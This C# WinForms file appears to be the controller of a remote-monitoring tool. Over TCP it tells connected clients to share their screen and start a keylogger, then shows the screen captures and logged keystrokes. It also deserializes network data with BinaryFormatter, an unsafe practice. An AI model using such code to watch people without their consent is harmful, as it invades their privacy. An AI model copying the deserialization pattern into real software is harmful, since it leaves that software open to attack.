using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Drawing.Imaging;
using System.Runtime.Serialization.Formatters.Binary;
namespace Server
{
    public partial class ControlForm : Form
    {
        private TcpClient client;
        private TcpClient screenClient;
        private TcpClient logClient;

        private TcpListener server;
        private TcpListener screenServer;
        private TcpListener logServer;

        private NetworkStream mainStream;
        private NetworkStream screenStream;
        private NetworkStream keylogStream;


        private static ManualResetEvent mre = new ManualResetEvent(false);

        private readonly Thread Listening;  
        private Thread GetImage;
        private Thread KeyLogger;

        bool stopsharing = false;
        public ControlForm(
                           TcpClient sclient,
                           TcpClient slogClient,
                           TcpClient sscreenClient
                          )
        {

            client = sclient;
            logClient = slogClient;
            screenClient = sscreenClient;
            //client = new TcpClient();

            //Listening = new Thread(StartListening);
            GetImage = new Thread(ReceiveImage);

            //Listening.IsBackground = true;
            GetImage.IsBackground = true;



            InitializeComponent();
        }
        //private void StartListening()
        //{
        //    try
        //    {
        //        server.Start();
        //        screenServer.Start();
        //        logServer.Start();
        //        while (true)
        //        {                             
        //            client = server.AcceptTcpClient();
        //            screenClient = screenServer.AcceptTcpClient();
        //            logClient = logServer.AcceptTcpClient();

        //            Random random = new Random();
        //            int length = 10;
        //            var secret = "";
        //            for (var i = 0; i < length; i++)
        //            {
        //                secret += ((char)(random.Next(1, 26) + 64)).ToString();

        //            }
        //            mainStream = client.GetStream();
        //            Byte[] sendsecret = Encoding.ASCII.GetBytes("secrete:" + secret + "$");
        //            mainStream.Write(sendsecret, 0, sendsecret.Length);

        //            //MessageBox.Show(secret);


        //        }

        //    }
        //    catch
        //    {
        //        StopListening();
        //    }
        //}
        //private void StopListening()
        //{
        //    server.Stop();
        //    screenServer.Stop();
        //    logServer.Stop();
        //    if (Listening.IsAlive)
        //        Listening.Abort();
        //    //if (GetImage.IsAlive)
        //    //    GetImage.Abort();

        //}
        private void StopSharing()
        {
            stopsharing = true;
        }
        private void ReceiveImage()
        {
            try
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                
                while (client.Connected && Thread.CurrentThread.IsAlive)
                {
                    if (stopsharing)
                    {
                        ScreenCapture.Image = null;
                        mre.WaitOne();
                        
                    }
                    screenStream = screenClient.GetStream();
                    ScreenCapture.Image = (Image)binaryFormatter.Deserialize(screenStream);
                    
                }
                //else
                    MessageBox.Show("Client disconnected");
            }
            catch { MessageBox.Show("Client disconnected"); }
        }
        private void btnShareScreen_Click(object sender, EventArgs e)
        {
            //Thread GetImage; 
            try
            {
                if (btnShareScreen.Text == "Share screen")
                {           
                    mainStream = client.GetStream();
                    Byte[] ShareScreenComand = Encoding.ASCII.GetBytes("Share Screen$");
                    mainStream.Write(ShareScreenComand, 0, ShareScreenComand.Length);

                    stopsharing = false;
                    //MessageBox.Show(mre.GetType().ToString());
                    if (!GetImage.IsAlive)
                    {
                        //GetImage = new Thread(ReceiveImage);
                        GetImage.Start();
                    }
                    else
                        mre.Set();
                

                    btnShareScreen.Text = "Stop sharing";
                }

                else if(btnShareScreen.Text == "Stop sharing")
                {
                    StopSharing();
                    mainStream = client.GetStream();
                    Byte[] StopShareScreenComand = Encoding.ASCII.GetBytes("Stop Share Screen$");
                    mainStream.Write(StopShareScreenComand, 0, StopShareScreenComand.Length);

                    btnShareScreen.Text = "Share screen";
                }    
            }
            catch(Exception)
            {
                MessageBox.Show("0 client connected");
            }

        }

        private void ControlForm_Load(object sender, EventArgs e)
        {
            //server = new TcpListener(IPAddress.Any, 8080);
            //screenServer = new TcpListener(IPAddress.Any, 8081);
            //logServer = new TcpListener(IPAddress.Any, 8082);
            //Listening.Start();
        }

        private void btnHenGio_Click(object sender, EventArgs e)
        {
            try
            {
                mainStream = client.GetStream();
                Form HenGio = new HenGio(mainStream);
                HenGio.Show();
            }
            catch(Exception)
            {
                MessageBox.Show("0 client connected");
            }

        }

        private void btnLogger_Click(object sender, EventArgs e)
        {
            try
            {
                mainStream = client.GetStream();

                Byte[] LogComand = Encoding.ASCII.GetBytes("log$");
                mainStream.Write(LogComand, 0, LogComand.Length);

                Form Keylog = new Keylogger(logClient);
                Keylog.Show();
            }
            catch(Exception ex)
            {
                MessageBox.Show("0 client connected");
            }

        }
    }
}
